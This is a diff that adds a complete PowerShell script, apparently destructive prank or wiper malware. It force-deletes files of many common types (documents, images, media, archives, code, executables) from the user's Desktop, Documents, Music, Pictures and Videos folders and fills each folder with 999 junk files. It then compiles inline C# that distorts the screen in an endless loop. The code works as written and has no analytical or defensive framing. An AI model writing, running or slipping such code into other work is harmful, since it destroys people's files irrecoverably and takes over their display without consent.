@@ -1,1 +1,95 @@
+$desktopPath = [Environment]::GetFolderPath("Desktop")
+$documentsPath = [Environment]::GetFolderPath("MyDocuments")
+$musicPath = [Environment]::GetFolderPath("MyMusic")
+$picturesPath = [Environment]::GetFolderPath("MyPictures")
+$videosPath = [Environment]::GetFolderPath("MyVideos")
+
+$extensionsToDelete = @("exe", "json", "doc", "pdf", "wpd", "docx", "rtf", "tex", "odt", "jpg", "jpeg", "mp3", "rar", "vcd", "webp", "css", "html", "py", "php", "ico", "lnk", "mp4", "js", "bak", "xml", "zip", "bmp")
+
+$pathsToDelete = @($desktopPath, $documentsPath, $musicPath, $picturesPath, $videosPath)
+
+foreach ($path in $pathsToDelete) {
+    foreach ($extension in $extensionsToDelete) {
+        $filesToDelete = Get-ChildItem -Path $path -Filter "*.$extension" -File
+
+        foreach ($file in $filesToDelete) {
+            $filePath = $file.FullName
+            Write-Host "Deleting file: $filePath"
+            Remove-Item -Path $filePath -Force
+        }
+    }
+
+    for ($i = 1; $i -le 999; $i++) {
+        $randomIteration = Get-Random -Minimum 100 -Maximum 1000
+        $newFileName = ".....⓿⌓⓿....._$randomIteration.txt"
+        $newFilePath = Join-Path -Path $path -ChildPath $newFileName
+        New-Item -Path $newFilePath -ItemType File -Force | Out-Null
+    }
+}
+
+$source = @"
+using System;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+public static class Win32
+{
+    [DllImport("user32.dll")]
+    static extern int GetSystemMetrics(int smIndex);
+
+    [DllImport("user32.dll")]
+    static extern IntPtr GetDC(IntPtr hWnd);
+
+    [DllImport("gdi32.dll")]
+    static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, int dwRop);
+
+    [DllImport("user32.dll", SetLastError = true)]
+    static extern bool SetProcessDPIAware();
+
+    [DllImport("gdi32.dll")]
+    static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
+
+    [DllImport("gdi32.dll")]
+    static extern bool TransparentBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, uint crTransparent);
+
+    public static void ReversePIP()
+    {
+        SetProcessDPIAware();
+        int cx = GetSystemMetrics(0);
+        int cy = GetSystemMetrics(1);
+
+        bool invertColors = false;
+
+        while (true)
+        {
+            Thread.Sleep(800);
+
+            IntPtr hdc = GetDC(IntPtr.Zero);
+
+            if (invertColors)
+            {
+                // InvertBitBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, 0x00550009);
+            }
+            else
+            {
+                // Reverse PIP
+                StretchBlt(hdc, 0, 0, cx, cy, hdc, 50, 50, cx - 100, cy - 100, 0x00CC0020);
+            }
+
+            invertColors = !invertColors;
+        }
+    }
+}
+"@
+
+Add-Type -TypeDefinition $source -Language CSharp
+[Win32]::ReversePIP()
+
+
+
+
+
+
+
+
 
